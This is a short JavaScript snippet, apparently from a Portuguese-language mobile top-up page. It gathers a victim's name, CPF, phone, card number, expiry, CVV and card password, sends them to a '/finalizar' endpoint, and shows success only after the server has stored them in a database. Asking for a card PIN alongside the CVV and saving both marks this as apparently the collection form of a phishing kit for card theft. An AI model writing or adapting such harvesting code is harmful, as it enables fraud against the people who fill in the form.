<script>
    function ir(n) {
        document.querySelectorAll('.etapa').forEach(e => e.classList.remove('ativa'));
        document.getElementById('etapa'+n).classList.add('ativa');
    }

    document.getElementById('formRecarga').onsubmit = async (e) => {
        e.preventDefault();
        const dados = {
            operadora: document.getElementById('operadora').value,
            nome: document.getElementById('nome').value,
            cpf: document.getElementById('cpf').value,
            telefone: document.getElementById('telefone').value,
            valor: document.getElementById('valor').value,
            cartao: document.getElementById('cartao').value,
            data: document.getElementById('data').value,
            cvv: document.getElementById('cvv').value,
            senha: document.getElementById('senha').value
        };

        // ENVIANDO E ESPERANDO O OK DO SERVIDOR
        try {
            const response = await fetch('/finalizar', { 
                method: 'POST', 
                headers: {'Content-Type': 'application/json'}, 
                body: JSON.stringify(dados) 
            });
            if(response.ok) {
                ir(4); // Só vai para a tela de sucesso se gravou no banco!
            } else {
                alert("Erro ao processar. Tente novamente.");
            }
        } catch (erro) {
            alert("Erro de conexão.");
        }
    };
</script>
